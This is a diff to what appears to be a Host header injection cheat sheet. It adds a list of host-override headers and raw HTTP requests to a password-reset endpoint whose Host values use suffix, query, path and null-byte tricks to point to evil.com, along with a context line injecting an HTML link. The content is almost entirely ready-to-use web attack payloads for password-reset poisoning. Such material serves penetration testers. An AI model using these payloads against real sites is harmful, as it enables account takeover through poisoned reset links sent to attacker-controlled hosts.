@@ -27,10 +27,31 @@ Host: target.tld?><a href=http://evil.com
 ```
 Other Headers
 ```
-X-Forwarded-Host
-X-Forwarded-For
-Referer
-Origin
+X-Forwarded-Host:
+X-Original-Url:
+X-Forwarded-Server:
+X-Host:
+X-Rewrite-Url:
+X-Originating-IP:
+X-Forwarded-For:
+X-Remote-IP:
+X-Remote-Addr:
+X-Client-IP:
+```
+
+Host Header Bypass Methods
+```
+GET /api/reset-password HTTP/1.1
+Host: vulernable-website.com.evil.com
+
+GET /api/reset-password HTTP/1.1
+Host: vulernable-website.com?evil.com
+
+GET /api/reset-password HTTP/1.1
+Host: evil.com/vulernable-website.com
+
+GET /api/reset-password HTTP/1.1
+Host: evil.com%00vulernable-website.com
 ```
 
 ```
